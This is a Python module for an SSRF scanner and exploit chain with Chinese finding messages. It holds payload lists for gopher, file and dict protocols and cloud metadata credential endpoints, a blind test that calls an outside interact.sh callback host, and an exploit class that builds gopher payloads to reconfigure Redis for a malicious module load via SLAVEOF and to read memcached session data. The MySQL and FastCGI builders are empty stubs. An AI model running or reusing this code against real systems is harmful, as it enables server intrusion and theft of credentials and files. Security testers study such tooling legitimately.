import re
import socket
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote, urlparse, parse_qs, urlencode
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("ssrf_engine")

SSRF_PAYLOADS = {
    "basic": [
        "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
        "http://[::1]", "http://0177.0.0.1", "http://0x7f000001",
        "http://2130706433", "http://017700000001",
        "http://127.1", "http://127.0.0.1.nip.io",
        "http://localtest.me", "http://spoofed.burpcollaborator.net",
    ],
    "protocol_gopher": [
        "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$",
        "gopher://127.0.0.1:3306/_",
        "gopher://127.0.0.1:11211/_",
        "gopher://127.0.0.1:25/_",
        "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/tmp",
    ],
    "protocol_file": [
        "file:///etc/passwd", "file:///etc/hosts", "file:///proc/self/environ",
        "file:///proc/self/cmdline", "file:///etc/shadow",
        "file://c:/windows/win.ini", "file://c:/windows/system32/drivers/etc/hosts",
    ],
    "protocol_dict": [
        "dict://127.0.0.1:6379/info",
        "dict://127.0.0.1:6379/config:get:dir",
    ],
    "cloud_metadata": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ],
    "dns_rebinding": [
        "http://127.0.0.1.nip.io",
        "http://127.0.0.1.sslip.io",
        "http://localtest.me",
    ],
}

SSRF_PARAMS = [
    "url", "uri", "link", "src", "href", "redirect", "redirect_url", "redirect_uri",
    "return", "return_url", "return_to", "next", "next_url", "callback", "callback_url",
    "target", "dest", "destination", "feed", "img", "image", "page", "file", "path",
    "load", "lang", "proxy", "proxy_url", "fetch", "site", "host", "server",
    "api", "api_url", "webhook", "endpoint", "service", "resource",
]

INTERNAL_IP_PATTERNS = [
    r"root:.*:0:0:", r"daemon:", r"127\.0\.0\.1",
    r"\[boot loader\]", r"EC2", r"ami-", r"instance-id",
    r"iam/security-credentials", r"computeMetadata",
]


class SSRFDetector:
    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.findings = []

    def scan(self) -> List[Dict]:
        self._detect_params()
        self._test_ssrf_in_url()
        self._test_header_injection()
        self._test_blind_ssrf()
        return self.findings

    def _detect_params(self):
        for param in SSRF_PARAMS:
            for payload in SSRF_PAYLOADS["basic"][:3]:
                url = f"{self.target_url}?{param}={quote(payload)}"
                resp = http_request("GET", url, timeout=self.timeout, verify=False)
                if resp and self._is_ssrf_indication(resp):
                    self.findings.append({
                        "type": "ssrf_detected",
                        "parameter": param,
                        "payload": payload,
                        "risk_level": "critical",
                        "detail": f"参数 {param} 存在SSRF漏洞",
                        "evidence": str(resp.get("text", ""))[:200],
                    })

    def _test_ssrf_in_url(self):
        url_params = parse_qs(urlparse(self.target_url).query)
        for param_name in url_params:
            for payload_type, payloads in SSRF_PAYLOADS.items():
                for payload in payloads[:2]:
                    test_url = self.target_url.replace(
                        f"{param_name}={url_params[param_name][0]}",
                        f"{param_name}={quote(payload)}"
                    )
                    resp = http_request("GET", test_url, timeout=self.timeout, verify=False)
                    if resp and self._is_ssrf_indication(resp):
                        self.findings.append({
                            "type": "ssrf_url_manipulation",
                            "parameter": param_name,
                            "payload": payload,
                            "payload_type": payload_type,
                            "risk_level": "critical",
                            "detail": f"URL参数 {param_name} 可被SSRF利用 (类型: {payload_type})",
                        })

    def _test_header_injection(self):
        header_payloads = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Original-URL": "/admin",
            "X-Rewrite-URL": "/admin",
            "Referer": "http://127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
        }
        for header_name, header_value in header_payloads.items():
            resp = http_request("GET", self.target_url,
                              headers={header_name: header_value},
                              timeout=self.timeout, verify=False)
            if resp:
                status = resp.get("status_code", 0)
                if status == 200:
                    baseline = http_request("GET", self.target_url, timeout=self.timeout, verify=False)
                    if baseline and baseline.get("status_code") != status:
                        self.findings.append({
                            "type": "header_based_ssrf",
                            "header": header_name,
                            "payload": header_value,
                            "risk_level": "high",
                            "detail": f"通过 {header_name} 头可绕过访问控制",
                        })

    def _test_blind_ssrf(self):
        ssrf_callback = self._generate_dns_callback()
        if ssrf_callback:
            for param in SSRF_PARAMS[:5]:
                url = f"{self.target_url}?{param}={quote(ssrf_callback)}"
                http_request("GET", url, timeout=self.timeout, verify=False)

    def _generate_dns_callback(self):
        return f"http://wyqyan-ssrf-{int(time.time())}.interact.sh"

    def _is_ssrf_indication(self, resp: Dict) -> bool:
        body = str(resp.get("text", ""))
        for pattern in INTERNAL_IP_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                return True
        return False


class SSRFChainExploit:
    def __init__(self, ssrf_url: str, timeout: int = 10):
        self.ssrf_url = ssrf_url
        self.timeout = timeout
        self.results = []

    def exploit_redis(self, target_host: str = "127.0.0.1", target_port: int = 6379) -> Dict:
        commands = [
            f"CONFIG SET dir /tmp",
            f"CONFIG SET dbfilename wyqyan_exploit.so",
            f"SLAVEOF {target_host} {target_port}",
        ]
        gopher_payload = self._build_gopher_payload(target_host, target_port, commands)
        result = self._send_gopher(gopher_payload)
        return {
            "service": "redis",
            "port": target_port,
            "method": "gopher_protocol",
            "payload": gopher_payload,
            "result": result,
        }

    def exploit_mysql(self, target_host: str = "127.0.0.1", target_port: int = 3306) -> Dict:
        gopher_payload = self._build_mysql_gopher(target_host, target_port)
        result = self._send_gopher(gopher_payload)
        return {
            "service": "mysql",
            "port": target_port,
            "method": "gopher_protocol",
            "payload": gopher_payload,
            "result": result,
        }

    def exploit_memcached(self, target_host: str = "127.0.0.1",
                          target_port: int = 11211) -> Dict:
        commands = ["stats", "get session_data"]
        gopher_payload = self._build_gopher_payload(target_host, target_port, commands)
        result = self._send_gopher(gopher_payload)
        return {
            "service": "memcached",
            "port": target_port,
            "method": "gopher_protocol",
            "payload": gopher_payload,
            "result": result,
        }

    def exploit_fastcgi(self, target_host: str = "127.0.0.1",
                        target_port: int = 9000) -> Dict:
        fcgi_payload = self._build_fastcgi_payload(target_host)
        result = self._send_gopher(f"gopher://{target_host}:{target_port}/_{quote(fcgi_payload)}")
        return {
            "service": "fastcgi",
            "port": target_port,
            "method": "gopher_protocol",
            "result": result,
        }

    def _build_gopher_payload(self, host: str, port: int, commands: List[str]) -> str:
        raw = "\r\n".join(commands) + "\r\n"
        encoded = quote(raw, safe='')
        return f"gopher://{host}:{port}/_{encoded}"

    def _build_mysql_gopher(self, host: str, port: int) -> str:
        return f"gopher://{host}:{port}/_"

    def _build_fastcgi_payload(self, host: str) -> str:
        return ""

    def _send_gopher(self, gopher_url: str) -> Dict:
        try:
            resp = http_request("GET", self.ssrf_url.replace("FUZZ", quote(gopher_url)),
                              timeout=self.timeout, verify=False)
            return {"sent": True, "response_code": resp.get("status_code") if resp else None}
        except Exception as e:
            return {"sent": False, "error": str(e)}


def scan_ssrf(target_url: str, timeout: int = 10) -> List[Dict]:
    detector = SSRFDetector(target_url, timeout)
    return detector.scan()


def exploit_ssrf_chain(ssrf_url: str, service: str = "redis",
                       target_host: str = "127.0.0.1", timeout: int = 10) -> Dict:
    exploit = SSRFChainExploit(ssrf_url, timeout)
    if service == "redis":
        return exploit.exploit_redis(target_host)
    elif service == "mysql":
        return exploit.exploit_mysql(target_host)
    elif service == "memcached":
        return exploit.exploit_memcached(target_host)
    elif service == "fastcgi":
        return exploit.exploit_fastcgi(target_host)
    return {"error": f"Unsupported service: {service}"}
